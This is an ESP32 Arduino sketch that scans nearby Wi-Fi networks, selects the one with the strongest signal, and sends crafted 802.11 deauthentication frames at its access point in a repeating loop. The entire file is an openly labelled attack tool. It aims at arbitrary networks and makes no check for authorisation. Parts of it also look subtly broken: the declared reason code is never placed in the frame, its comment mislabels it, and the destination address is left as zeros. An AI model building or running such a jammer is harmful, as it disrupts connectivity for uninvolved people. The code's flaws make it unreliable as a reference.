#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_system.h>

#define DEAUTH_REASON 7  // Reason for deauthentication, 7 is "class 3 frame" (disassociation)

// Define how long the attack should run (in milliseconds)
#define DEAUTH_DURATION 5000  // Attack duration: 5 seconds
#define SCAN_INTERVAL 10000  // Interval before scanning again: 10 seconds

unsigned long lastScanTime = 0;
unsigned long lastDeauthTime = 0;
bool isAttacking = false;

void setup() {
  Serial.begin(115200);
  
  // Initialize Wi-Fi in Station mode
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();  // Disconnect any active connection

  // Start initial scan
  lastScanTime = millis();
}

void loop() {
  unsigned long currentMillis = millis();

  // If it's time to scan for new networks
  if (currentMillis - lastScanTime >= SCAN_INTERVAL) {
    Serial.println("Scanning for Wi-Fi networks...");
    scan_wifi_networks();
    lastScanTime = currentMillis;  // Reset scan timer
  }

  // If we're currently attacking a network, check if the attack duration has passed
  if (isAttacking && currentMillis - lastDeauthTime >= DEAUTH_DURATION) {
    Serial.println("Deauth attack finished, restarting scanning...");
    isAttacking = false;  // Stop attacking after the duration
  }
}

void scan_wifi_networks() {
  esp_wifi_scan_start(NULL, true);  // Start scanning for Wi-Fi networks
  
  // Wait for the scan to complete
  delay(2000);

  // Get the list of networks
  wifi_ap_record_t *scan_results;
  uint16_t network_count = 0;
  esp_wifi_scan_get_ap_records(&network_count, NULL);
  scan_results = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * network_count);
  esp_wifi_scan_get_ap_records(&network_count, scan_results);

  // If no networks are found
  if (network_count == 0) {
    Serial.println("No Wi-Fi networks found.");
    free(scan_results);
    return;
  }

  Serial.println("Networks found:");
  // Print SSID and RSSI of each network found
  for (int i = 0; i < network_count; i++) {
    Serial.print("SSID: ");
    Serial.print((char *)scan_results[i].ssid);
    Serial.print(" RSSI: ");
    Serial.println(scan_results[i].rssi);
  }

  // Find the strongest network (highest RSSI)
  int strongest_network = -1;
  int highest_rssi = -100;

  for (int i = 0; i < network_count; i++) {
    if (scan_results[i].rssi > highest_rssi) {
      highest_rssi = scan_results[i].rssi;
      strongest_network = i;
    }
  }

  // If a strongest network is found, send deauth frames
  if (strongest_network != -1) {
    Serial.println();
    Serial.println("Selecting the strongest network based on RSSI...");
    Serial.print("The strongest network is: ");
    Serial.print((char *)scan_results[strongest_network].ssid);
    Serial.print(" with RSSI: ");
    Serial.println(scan_results[strongest_network].rssi);
    
    // Start deauth attack and reset the timer
    Serial.println("Sending Deauth Packet to the selected network...");
    send_deauth(scan_results[strongest_network].bssid);
    lastDeauthTime = millis();  // Set the deauth timer
    isAttacking = true;  // Indicate that we are attacking now
  }

  free(scan_results);  // Clean up
}

void send_deauth(uint8_t *bssid) {
  // Creating deauth frame
  uint8_t deauth_frame[26] = {0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                               0x00, 0x00};  // Deauthentication frame template

  // Fill in the BSSID (MAC address of the target AP)
  for (int i = 0; i < 6; i++) {
    deauth_frame[10 + i] = bssid[i];
    deauth_frame[16 + i] = bssid[i];
  }

  // Send deauth frame
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
  Serial.println("Deauth packet sent.");
}
